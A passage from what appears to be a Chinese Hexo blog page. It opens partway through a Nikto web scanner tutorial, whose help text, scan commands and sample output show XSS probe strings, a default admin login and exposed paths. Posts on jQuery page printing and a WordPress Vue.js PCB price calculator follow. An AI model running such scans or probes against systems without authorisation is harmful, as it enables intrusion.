+   -config+            Use this config file
+   -Cgidirs+           scan these CGI dirs: &#39;none&#39;, &#39;all&#39;, or values like &quot;/cgi/ /cgi-a/&quot;
+   -dbcheck            check database and other key files for syntax errors
+   -Display+           Turn on/off display outputs
+   -evasion+           ids evasion technique
+   -Format+            save file (-o) format
+   -host+              target host
+   -Help               Extended help information
+   -id+                Host authentication to use, format is id:pass or id:pass:realm
+   -list-plugins       List all available plugins
+   -mutate+            Guess additional file names
+   -mutate-options+    Provide extra information for mutations
+   -output+            Write output to this file
+   -nocache            Disables the URI cache
+   -nossl              Disables using SSL
+   -no404              Disables 404 checks
+   -port+              Port to use (default 80)
+   -Plugins+           List of plugins to run (default: ALL)
+   -root+              Prepend root value to all requests, format is /directory
+   -ssl                Force ssl mode on port
+   -Single             Single request mode
+   -timeout+           Timeout (default 2 seconds)
+   -Tuning+            Scan tuning
+   -update             Update databases and plugins from CIRT.net
+   -vhost+             Virtual host (for Host header)
+   -Version            Print plugin and database versions
+       + requires a value
+Note: This is the short help output. Use -H for full help.</code></pre>
+<p>这个报错只是告诉我们没有给出必要的参数。SSL 支持可以通过安装相关的 perl ssl 模块得到（sudo apt-get install libnet-ssleay-perl）。</p>
+<p><strong>更新 nikto 数据库</strong></p>
+<p>在开始使用之前我们需要先更新 nikto 数据库：</p>
+<pre><code>/usr/local/bin/nikto.pl -update</code></pre>
+<p>下面的命令可以列出可用的 nikto 插件。</p>
+<pre><code>nikto.pl -list-plugins // To list the installed plugins //</code></pre>
+<p><strong>扫描以寻找缺陷</strong></p>
+<p>我们用一个 url 来在做个简单的测试。</p>
+<pre><code>perl nikto.pl -h http://www.host-name.com</code></pre>
+<p><strong>输出样例</strong></p>
+<p>会有十分冗长的输出，可能一开始会让人感到困惑。许多 Nikto 的警报会返回 OSVDB 序号。这是由开源缺陷数据库（<a target="_blank" rel="noopener" href="http://osvdb.org/%EF%BC%89%E6%89%80%E6%8C%87%E5%AE%9A%E3%80%82%E4%BD%A0%E5%8F%AF%E4%BB%A5%E5%9C%A8">http://osvdb.org/）所指定。你可以在</a> OSVDB 上找出相关缺陷的深入说明。</p>
+<pre><code>$ nikto -h http://www.host-name.com
+- Nikto v2.1.4
+---------------------------------------------------------------------------
++ Target IP:         1.2.3.4
++ Target Hostname:    host-name.com
++ Target Port:        80
++ Start Time:         2012-08-11 14:27:31
+---------------------------------------------------------------------------
++ Server: Apache/2.2.22 (FreeBSD) mod_ssl/2.2.22 OpenSSL/1.0.1c DAV/2
++ robots.txt contains 4 entries which should be manually viewed.
++ mod_ssl/2.2.22 appears to be outdated (current is at least 2.8.31) (may depend on server version)
++ ETag header found on server, inode: 5918348, size: 121, mtime: 0x48fc943691040
++ mod_ssl/2.2.22 OpenSSL/1.0.1c DAV/2 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit). CVE-2002-0082, OSVDB-756.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE 
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /lists/admin/: PHPList pre 2.6.4 contains a number of vulnerabilities including remote administrative access, harvesting user info and more. Default login to admin interface is admin/phplist
++ OSVDB-2322: /gallery/search.php?searchstring=&lt;script&gt;alert(document.cookie)&lt;/script&gt;: Gallery 1.3.4 and below is vulnerable to Cross Site Scripting (XSS). Upgrade to the latest version. http://www.securityfocus.com/bid/8288.
++ OSVDB-7022: /calendar.php?year=&lt;script&gt;alert(document.cookie);&lt;/script&gt;&amp;month=03&amp;day=05: DCP-Portal v5.3.1 is vulnerable to  Cross Site Scripting (XSS). http://www.cert.org/advisories/CA-2000-02.html.
++ OSVDB-3233: /phpinfo.php: Contains PHP configuration information
++ OSVDB-3092: /system/: This might be interesting...
++ OSVDB-3092: /template/: This may be interesting as the directory may hold sensitive files or reveal system information.
++ OSVDB-3092: /updates/: This might be interesting...
++ OSVDB-3092: /README: README file found.
++ 6448 items checked: 1 error(s) and 14 item(s) reported on remote host
++ End Time:           2012-08-11 15:52:57 (5126 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+$</code></pre>
+<p>Nikto 是一个非常轻量级的通用工具。因为 Nikto 是用 Perl 写的，所以它可以在几乎任何服务器的操作系统上运行。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/22/js%E6%88%96jquery%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E6%89%93%E5%8D%B0%E5%8F%AF%E5%B1%80%E9%83%A8%E6%89%93%E5%8D%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/22/js%E6%88%96jquery%E5%AE%9E%E7%8E%B0%E9%A1%B5%E9%9D%A2%E6%89%93%E5%8D%B0%E5%8F%AF%E5%B1%80%E9%83%A8%E6%89%93%E5%8D%B0/" class="post-title-link" itemprop="url">js或jquery实现页面打印可局部打印</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-22 20:49:21" itemprop="dateCreated datePublished" datetime="2017-11-22T20:49:21+08:00">2017-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:29" itemprop="dateModified" datetime="2020-10-11T11:53:29+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>js或jquery实现页面打印(局部打印) </p>
+<p>1、js实现（可实现局部打印）</p>
+<pre><code>&lt;html&gt; 
+&lt;title&gt;js打印&lt;/title&gt; 
+&lt;head&gt;&lt;/head&gt;&lt;body&gt; 
+&lt;input id=&quot;btnPrint&quot; type=&quot;button&quot; value=&quot;打印&quot; onclick=&quot;javascript:window.print();&quot; /&gt; 
+
+&lt;input id=&quot;btnPrint&quot; type=&quot;button&quot; value=&quot;打印预览&quot; onclick=preview(1) /&gt; 
+&lt;style type=&quot;text/css&quot; media=print&gt; 
+.noprint&#123;display : none &#125; 
+&lt;/style&gt; 
+
+
+&lt;p class=&quot;noprint&quot;&gt;不需要打印的地方&lt;/p&gt; 
+
+&lt;script&gt; 
+function preview(oper) 
+&#123; 
+if (oper &lt; 10) 
+&#123; 
+bdhtml=window.document.body.innerHTML;//获取当前页的html代码 
+sprnstr=&quot;&lt;!--startprint&quot;+oper+&quot;--&gt;&quot;;//设置打印开始区域 
+eprnstr=&quot;&lt;!--endprint&quot;+oper+&quot;--&gt;&quot;;//设置打印结束区域 
+prnhtml=bdhtml.substring(bdhtml.indexOf(sprnstr)+18); //从开始代码向后取html 
+
+prnhtml=prnhtml.substring(0,prnhtml.indexOf(eprnstr));//从结束代码向前取html 
+window.document.body.innerHTML=prnhtml; 
+window.print(); 
+window.document.body.innerHTML=bdhtml; 
+&#125; else &#123; 
+window.print(); 
+&#125; 
+&#125; 
+&lt;/script&gt; 
+&lt;p&gt;XXXXX&lt;/p&gt; 
+&lt;!--startprint1--&gt;要打印的内容&lt;!--endprint1--&gt; 
+&lt;/body&gt; 
+&lt;/html&gt; </code></pre>
+<p>2、调用windows底层打印，报安全警告，不建议使用（不支持局部打印）</p>
+<pre><code>&lt;HTML&gt; 
+&lt;HEAD&gt; 
+&lt;TITLE&gt;javascript打印-打印页面设置-打印预览代码&lt;/TITLE&gt; 
+&lt;META http-equiv=Content-Type content=&quot;text/html; charset=gb2312&quot; /&gt; 
+&lt;SCRIPT language=javascript&gt; 
+　　function printsetup()&#123; 
+　　// 打印页面设置 
+　　wb.execwb(8,1); 
+　　&#125; 
+　　function printpreview()&#123; 
+　　// 打印页面预览 
+　　　　 
+　　wb.execwb(7,1); 　　　　　 
+　　　　 
+　　&#125; 
+
+　　function printit() 
+　　&#123; 
+　　if (confirm(&#39;确定打印吗？&#39;)) &#123; 
+　　wb.execwb(6,6); 
+　　&#125; 
+　　&#125; 
+　　&lt;/SCRIPT&gt; 
+&lt;/HEAD&gt; 
+&lt;BODY&gt; 
+
+&lt;DIV align=center&gt; 
+&lt;OBJECT id=wb height=0 width=0 
+classid=CLSID:8856F961-340A-11D0-A96B-00C04FD705A2 name=wb&gt;&lt;/OBJECT&gt; 
+&lt;INPUT onclick=javascript:printit() type=button value=打印 name=button_print /&gt; 
+&lt;INPUT onclick=javascript:printsetup(); type=button value=打印页面设置 name=button_setup /&gt; 
+&lt;INPUT onclick=javascript:printpreview(); type=button value=打印预览 name=button_show /&gt; 
+一按开始的减肥了卡时间段 
+&lt;/DIV&gt; 
+&lt;/BODY&gt; 
+&lt;/HTML&gt;</code></pre>
+<p>3、jQuery实现（支持局部打印）</p>
+<pre><code>&lt;html&gt; 
+&lt;head&gt; 
+&lt;script type=&quot;text/javascript&quot; src=&quot;jquery-1.6.4.js&quot;&gt;&lt;/script&gt; 
+&lt;script&gt; 
+$(function()&#123; 
+$(&quot;input#biuuu_button&quot;).click(function()&#123; 
+$(&quot;div#myPrintArea&quot;).printArea(); 
+&#125;); 
+&lt;/script&gt; 
+&lt;/head&gt; 
+&lt;body&gt; 
+&lt;input id=&quot;biuuu_button&quot; type=&quot;button&quot; value=&quot;打印&quot;&gt;&lt;/input&gt; 
+&lt;div id=&quot;myPrintArea&quot;&gt;.....文本打印部分.....&lt;/div&gt; &lt;div class=&quot;quote_title&quot;&gt;引用&lt;/div&gt;&lt;div class=&quot;quote_div&quot;&gt;&lt;/div&gt; 
+&lt;/body&gt; 
+&lt;/html&gt;</code></pre>
+<p>上面的预览和打印按钮不希望打印，如果要过滤的话可以做下面的样式设置</p>
+<pre><code>&lt;style type=&quot;text/css&quot;&gt;
+  @media print &#123;
+    .noprint&#123;
+      display: none;
+    &#125;
+  &#125;
+&lt;/style&gt;</code></pre>
+<p>or</p>
+<pre><code>&lt;style type=&quot;text/css&quot; media=&quot;print&quot;&gt;
+  .noprint&#123;
+    display: none;
+  &#125;
+&lt;/style&gt;</code></pre>
+<p>两种写法任选其一</p>
+<p><strong>分页打印</strong></p>
+<p>使用 window.print() 打印时，如果内容超出会自动分页。但是我们如果需要自定义分页范围，如碰到表格分页打印，可以通过进行如下设置：</p>
+<pre><code>&lt;table width=&quot;100%&quot; border=&quot;0&quot; cellpadding=&quot;0&quot; cellspacing=&quot;0&quot; style=&quot;page-break-after:always&quot; &gt; 
+&lt;/table&gt;</code></pre>
+<p>方式二、jqprint()</p>
+<p>jqprint是一个基于jQuery编写的页面打印的一个小插件，但是不得不承认这个插件确实很厉害，最近的项目中帮了我的大忙，在Web打印的方面，前端的打印基本是靠window.print()的方式进行打印的，而这个插件在其基础上进行了进一步的封装，可以轻松实现打印网页上的某个区域，这是个亮点。</p>
+<p>参考网址：<a target="_blank" rel="noopener" href="http://www.jb51.net/article/102230.htm">http://www.jb51.net/article/102230.htm</a></p>
+<p>请注意!很多朋友遇到 Cannot read property ‘opera’ of undefined 错误问题是juqery版本兼容问题</p>
+<p>解决方法：加入迁移辅助插件 jquery-migrate-1.0.0.js可解决版本问题</p>
+<p>引入</p>
+<pre><code>&lt;script language=&quot;javascript&quot; src=&quot;jquery-1.4.4.min.js&quot;&gt;&lt;/script&gt;
+&lt;script language=&quot;javascript&quot; src=&quot;jquery.jqprint-0.3.js&quot;&gt;&lt;/script&gt;</code></pre>
+<p>js</p>
+<pre><code>&lt;script language=&quot;javascript&quot;&gt;
+function a()&#123;
+    $(&quot;#ddd&quot;).jqprint();
+  &#125;
+&lt;/script&gt;</code></pre>
+<p>html</p>
+<pre><code>&lt;div id=&quot;ddd&quot;&gt;
+  &lt;table&gt;
+    &lt;tr&gt;
+      &lt;td&gt;test&lt;/td&gt;
+      &lt;td&gt;test&lt;/td&gt;
+      &lt;td&gt;test&lt;/td&gt;
+      &lt;td&gt;test&lt;/td&gt;
+      &lt;td&gt;test&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/table&gt;
+&lt;/div&gt;
+&lt;input type=&quot;button&quot; onclick=&quot; a()&quot; value=&quot;打印&quot;/&gt;</code></pre>
+<p>设置模板打印</p>
+<pre><code>$(&quot;#printContainer&quot;).jqprint(&#123;
+   debug: false, //如果是true则可以显示iframe查看效果（iframe默认高和宽都很小，可以再源码中调大），默认是false
+   importCSS: true, //true表示引进原来的页面的css，默认是true。（如果是true，先会找$(&quot;link[media=print]&quot;)，若没有会去找$(&quot;link&quot;)中的css文件）
+   printContainer: true, //表示如果原来选择的对象必须被纳入打印（注意：设置为false可能会打破你的CSS规则）。
+   operaSupport: true//表示如果插件也必须支持歌opera浏览器，在这种情况下，它提供了建立一个临时的打印选项卡。默认是true
+&#125;);</code></pre>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2017/11/22/%E9%87%87%E7%94%A8vuee-js%E7%9A%84%E6%96%B9%E5%BC%8F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E4%BA%8Ewordpress%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2017/11/22/%E9%87%87%E7%94%A8vuee-js%E7%9A%84%E6%96%B9%E5%BC%8F%E8%AE%BE%E8%AE%A1%E5%9F%BA%E4%BA%8Ewordpress%E7%9A%84%E8%AE%A1%E7%AE%97%E5%99%A8/" class="post-title-link" itemprop="url">采用vuee.js的方式设计基于wordpress的计算器</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2017-11-22 18:58:20" itemprop="dateCreated datePublished" datetime="2017-11-22T18:58:20+08:00">2017-11-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2020-10-11 11:53:05" itemprop="dateModified" datetime="2020-10-11T11:53:05+08:00">2020-10-11</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>这个版本支持了计价器的乘法和加法混合使用，以及引入了select的方式，根据下拉式选择不同的选项，计算不同的价格</p>
+<p>必要的文件引入：jquery.js和jquery.lightbox_me.js</p>
+<p>我这个是以wordpress的默认主题twentyfifteen作为测试的，在主题的目录下新建一个页面模板文件。这里已经做好了，把jisuanqi.php传上去即可，然后在页面那里，调用这个模板即可，如果是其他主题，可以把page.php文件下载下来，重命名成自己想要的即可，然后给模板命名，把我这个里面有关计算器的东西加进去即可。</p>
+<p>这里为了能够动态的显示计价器所选择的内容，引入了vue.js这个。</p>
+<p>在wordpress网站里面，我在header.php的head标签里面引入了：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot; src=&quot;&lt;?php bloginfo(&#39;template_url&#39;); ?&gt;/js/jquery.js&quot;&gt;&lt;/script&gt;
+&lt;script type=&quot;text/javascript&quot; src=&quot;&lt;?php bloginfo(&#39;template_url&#39;); ?&gt;/js/jquery.lightbox_me.js&quot;&gt;&lt;/script&gt;  //控制弹窗的js文件
+&lt;script src=&quot;https://cdn.bootcss.com/vue/2.5.3/vue.min.js&quot;&gt;&lt;/script&gt;  //双向绑定，动态显示输入框的值</code></pre>
+<p>控制样式的代码为：</p>
+<pre><code>&lt;style type=&quot;text/css&quot;&gt;
+    #zhib-cal&#123;
+    background:#03A9F4;
+    width:440px;
+    /*height:510px;*/
+    box-shadow: 1px 1px 14px 4px #586298;
+    &#125;
+
+    #calSum,#calAmount,#calYear,#calPrecent&#123;
+        height: 32px;
+        width: 220px;
+        font-size: 14px;
+        margin:10px 0px;
+        border: 1px solid #ddd;
+    &#125;
+    #calSum&#123;
+        background: #999999;
+        color:#FFF;
+    &#125;
+    #zhib-daikjisuan&#123;
+        padding: 0px;
+    &#125;
+
+    #zhib-daikjisuan-title&#123;
+        background: #666;
+        padding: 5px;
+        color: #fff;
+    &#125;
+
+    #zhib-daikjisuan-title p&#123;
+        font-size: 16px;
+        text-align: center;
+        font-weight: bold;
+        color: #baa26c;
+    &#125;
+
+    #calAmount,#calYear,#calPrecent&#123;
+        background: #f5f5f5;
+        border-radius: 3px;
+        color:#333333;
+
+    &#125;
+    #jisuan-jieguo&#123;
+        margin: 0px auto;
+        padding: 10px;
+    &#125;
+    #jisuan-jieguo p&#123;
+        text-align: center;
+    &#125;
+
+    #jisuan-jieguo a&#123;
+        background: #333333;
+        border-radius: 2px;
+        padding: 10px 20px;
+        text-decoration: none;
+        color: #fff;
+    &#125;
+    #jisuan-jieguo a:hover&#123;
+        color: #ffffff;
+        background:#000000;
+    &#125;
+    #mianze&#123;
+        margin: 10px auto;
+        color: #fff;
+        padding: 15px 5px;
+        background: #666666;
+    &#125;
+    #mianze p&#123;
+     font-size:14px;
+      text-align:justify;
+    &#125;
+
+    #zhib-zhognjain&#123;
+        padding: 20px 10px;
+    &#125;
+    #zhib-zhognjain table&#123;
+     border:0px;
+    &#125;
+    #zhib-zhognjain table td&#123;
+     border-width: 0px 0px 0px 0px;
+    &#125;
+    #jisuanji-anj&#123;
+      text-align:center;
+      padding:10px;
+      background:#baa26c;
+    &#125;
+    #jisuanji-anj a&#123;
+      color:#fff;
+      font-size:18px;
+      font-weight:700;
+    &#125;
+
+    a:hover&#123;
+    color:#999 !important;
+    &#125;
+
+&lt;/style&gt;</code></pre>
+<p>控制计算的js代码为：</p>
+<pre><code>&lt;script type=&quot;text/javascript&quot; charset=&quot;utf-8&quot;&gt;
+    function showLightBox(divId) &#123;
+        $(&quot;#calculator&quot;).lightbox_me(&#123;
+            centered: true,
+            onLoad: function() &#123;
+
+            &#125;
+        &#125;);
+    &#125;
+    function closeTuceng()&#123;
+       $(&quot;#calculator&quot;).hide();
+    &#125;
+&lt;/script&gt;
+
+&lt;script&gt;
+    // 对网站语言进行判断 开始
+    var i18n = &#123;
+            calculation: &#123;
+                en: &#39;The calculation may take a long time, continue?&#39;,
+                &#39;zh-hant&#39;: &#39;可能需要点时间进行计算&#39;
+            &#125;
+        &#125;,
+    lang = document.getElementsByTagName(&#39;html&#39;)[0].getAttribute(&#39;lang&#39;),
+    confirmation = true;
+    // 对网站语言进行判断 结束
+
+    function PMT() &#123;
+
+        // 获取各个表单的值 开始
+        var cengs = document.getElementById(&#39;cengshu&#39;).value;
+        var kuangd = document.getElementById(&#39;kuangdu&#39;).value;
+        var changd = document.getElementById(&#39;changdu&#39;).value;
+        var shul = document.getElementById(&#39;shuliang&#39;).value;
+        var banzihoud = document.getElementById(&#39;banzihoudu&#39;).value;
+        var pingbankuans = document.getElementById(&#39;pingbankuanshu&#39;).value;
+        var zifuyanseselected =$(&#39;#zifuyanse option:selected&#39;).val();
+        var zuhanyans =document.getElementById(&#39;zuhanyanse&#39;);
+        var zuhanyanseselected=$(&#39;#zuhanyanse option:selected&#39;).val();
+        var fapiaoselected=$(&#39;#fapiao option:selected&#39;).val();
+        var fahuoshijianselected=$(&#39;#fahuoshijian option:selected&#39;).val();
+        var feizhenceshiselected=$(&#39;#feizhenceshi option:selected&#39;).val();
+        var zuhanfugaiselected=$(&#39;#zuhanfugai option:selected&#39;).val();
+        var sum = 0;
+        // 获取各个表单的值 结束
+
+        // 检测 如果表单输入的是非数字值 那么计算的结果将会变成0 开始
+        if (isNaN(shul) == true) sum = 0;
+        if (isNaN(kuangd) == true) sum = 0;
+        if (isNaN(changd) == true) sum = 0;
+        if (isNaN(cengs) == true) sum = 0;
+        if (isNaN(banzihoud) == true) sum = 0;
+        if (isNaN(pingbankuans) == true) sum = 0;
+        // 检测 如果表单输入的是非数字值 那么计算的结果将会变成0 结束
+
+        // 计算总数 开始
+        sum=(cengs*kuangd*changd*shul*banzihoud*pingbankuans)+parseInt(zifuyanseselected)+parseInt(zuhanyanseselected)+parseInt(fapiaoselected)+parseInt(fahuoshijianselected)+parseInt(zuhanfugaiselected)+parseInt(feizhenceshiselected);
+        // 计算总数 结束
+
+    // 判断 如果各项指标都填写了，那么把计算结果输出 开始
+
+        // 判断 单纯的整数相乘计算 开始
+        if (cengs &amp;&amp; kuangd &amp;&amp; changd &amp;&amp; shul &amp;&amp; pingbankuans &amp;&amp; zifuyanseselected &amp;&amp; banzihoud &amp;&amp; fapiaoselected &amp;&amp; fahuoshijianselected &amp;&amp; zuhanfugaiselected &amp;&amp; feizhenceshiselected) &#123;
+            return document.getElementById(&#39;calSum&#39;).value = &#39;￥&#39; + sum;
+            // document.getElementById(&#39;result&#39;).innerHTML=&quot;&lt;div&gt;&lt;p&gt;板子层数：&quot;cengs&quot;&lt;/p&gt;&lt;p&gt;板子宽度：&quot;kuangd&quot;&lt;/p&gt;&lt;p&gt;板子长度：&quot;changd&quot;&lt;/p&gt;&lt;p&gt;板子数量：&quot;shul&quot;&lt;/p&gt;&lt;/div&gt;&quot;
+        &#125;
+        // 判断 单纯的整数相乘计算 结束
+
+
+    // 判断 如果各项指标都填写了，那么把计算结果输出 结束
+    &#125;
+
+    // 清空表单内容 开始
+    function calClear() &#123;
+        document.getElementById(&#39;cengshu&#39;).value = &#39;&#39;;
+        document.getElementById(&#39;kuangdu&#39;).value = &#39;&#39;;
+        document.getElementById(&#39;changdu&#39;).value = &#39;&#39;;
+        document.getElementById(&#39;shuliang&#39;).value = &#39;&#39;;
+        document.getElementById(&#39;banzihoudu&#39;).value = &#39;&#39;;
+        document.getElementById(&#39;pingbankuanshu&#39;).value = &#39;&#39;;
+        document.getElementById(&#39;calSum&#39;).value = &#39;&#39;;
+    &#125;
+    // 清空表单内容 结束
+&lt;/script&gt;</code></pre>
+<p>表单内容显示的区域代码：</p>
+<pre><code>&lt;div id=&quot;jisuanji-anj&quot;&gt;
+    &lt;a class=&quot;buttons&quot; href=&quot;javascript:;&quot; onclick=&quot;showLightBox(&amp;#39;calculator&amp;#39;);&quot;&gt;
+        &lt;div style=&quot;padding:15px 0;&quot;&gt;PCB在线计价&lt;/div&gt;
+    &lt;/a&gt;
+&lt;/div&gt;
+&lt;div id=&quot;calculator&quot; class=&quot;lightBox&quot; style=&quot;left: 50%; margin-left: -170.5px; z-index: 1002; position: fixed; top: 40%; margin-top: -60px; display: none;&quot;&gt;
+    &lt;div id=&quot;zhib-cal&quot;&gt;
+
+        &lt;div id=&quot;zhib-daikjisuan&quot;&gt;
+
+            &lt;div id=&quot;zhib-daikjisuan-title&quot;&gt;
+                &lt;p&gt;PCB在线计价&lt;/p&gt;
+            &lt;/div&gt;
+            &lt;div id=&quot;zhib-zhognjain&quot;&gt;
+                &lt;table&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;
+                            板子层数
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;input type=&quot;text&quot; id=&quot;cengshu&quot; v-model=&quot;picked&quot; onchange=&quot;PMT();&quot; placeholder=&quot;cm&quot;&gt;
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            板子宽度
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;input type=&quot;text&quot; id=&quot;kuangdu&quot; v-model=&quot;kuang&quot; onchange=&quot;PMT();&quot; placeholder=&quot;cm&quot;&gt;
+                        &lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;
+                            板子长度
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;input type=&quot;text&quot; id=&quot;changdu&quot; v-model=&quot;chang&quot; onchange=&quot;PMT();&quot; placeholder=&quot;cm&quot;&gt;
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            板子数量
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;input type=&quot;text&quot; id=&quot;shuliang&quot; v-model=&quot;shuliangss&quot; onchange=&quot;PMT();&quot; placeholder=&quot;填写整数&quot;&gt;
+                        &lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;
+                            板子厚度
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;input type=&quot;text&quot; id=&quot;banzihoudu&quot; v-model=&quot;banhoudu&quot; onchange=&quot;PMT();&quot; placeholder=&quot;cm&quot;&gt;
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            拼版款数
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;input type=&quot;text&quot; id=&quot;pingbankuanshu&quot; v-model=&quot;pingbanks&quot; onchange=&quot;PMT();&quot; placeholder=&quot;填写整数&quot;&gt;
+                        &lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;
+                            字符颜色
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;select id=&quot;zifuyanse&quot; v-model=&quot;zifuys&quot;&gt;
+                                &lt;option value=&quot;20&quot; onchange=&quot;PMT();&quot;&gt;白色&lt;/option&gt;
+                                &lt;option value=&quot;50&quot; onchange=&quot;PMT();&quot;&gt;红色&lt;/option&gt;
+                            &lt;/select&gt;
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            阻焊颜色
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;select id=&quot;zuhanyanse&quot; v-model=&quot;zuhanys&quot;&gt;
+                                &lt;option value=&quot;20&quot; onchange=&quot;PMT();&quot;&gt;白色&lt;/option&gt;
+                                &lt;option value=&quot;40&quot; onchange=&quot;PMT();&quot;&gt;蓝色&lt;/option&gt;
+                                &lt;option value=&quot;30&quot; onchange=&quot;PMT();&quot;&gt;红色&lt;/option&gt;
+                                &lt;option value=&quot;70&quot; onchange=&quot;PMT();&quot;&gt;紫色&lt;/option&gt;
+                            &lt;/select&gt;
+                        &lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;
+                            需要发票？
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;select id=&quot;fapiao&quot; v-model=&quot;selected&quot;&gt;
+                                &lt;option value=&quot;15&quot; onchange=&quot;PMT();&quot;&gt;需要&lt;/option&gt;
+                                &lt;option value=&quot;0&quot; onchange=&quot;PMT();&quot;&gt;不需要&lt;/option&gt;
+                            &lt;/select&gt;
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            发货时间
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;select id=&quot;fahuoshijian&quot; v-model=&quot;fahuo&quot;&gt;
+                                &lt;option value=&quot;0&quot; onchange=&quot;PMT();&quot;&gt;正常2-3天(样板)&lt;/option&gt;
+                                &lt;option value=&quot;15&quot; onchange=&quot;PMT();&quot;&gt;样板48小时加急&lt;/option&gt;
+                                &lt;option value=&quot;20&quot; onchange=&quot;PMT();&quot;&gt;正常3-4天(样板)&lt;/option&gt;
+                                &lt;option value=&quot;25&quot; onchange=&quot;PMT();&quot;&gt;样板24小时加急&lt;/option&gt;
+                            &lt;/select&gt;
+                        &lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;
+                            阻焊覆盖
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;select id=&quot;zuhanfugai&quot; v-model=&quot;zuhanfg&quot;&gt;
+                                &lt;option value=&quot;35&quot; onchange=&quot;PMT();&quot;&gt;过孔盖油&lt;/option&gt;
+                                &lt;option value=&quot;45&quot; onchange=&quot;PMT();&quot;&gt;过孔开窗&lt;/option&gt;
+                            &lt;/select&gt;
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            飞针测试
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;select id=&quot;feizhenceshi&quot; v-model=&quot;feizhen&quot;&gt;
+                                &lt;!-- &lt;option value=&quot;0&quot; onchange=&quot;PMT();&quot;&gt;全部测试(免费)&lt;/option&gt; --&gt;
+                                &lt;option v-for=&quot;option in options&quot; v-bind:value=&quot;option.value&quot; onchange=&quot;PMT();&quot;&gt;
+                                &#123;&#123; option.text &#125;&#125;
+                                &lt;/option&gt;
+                            &lt;/select&gt;
+                        &lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;
+                            总价格
+                        &lt;/td&gt;
+                        &lt;td&gt;
+                            &lt;input type=&quot;text&quot; id=&quot;calSum&quot; value=&quot;￥ &quot; readonly=&quot;&quot;&gt;
+                        &lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/table&gt;
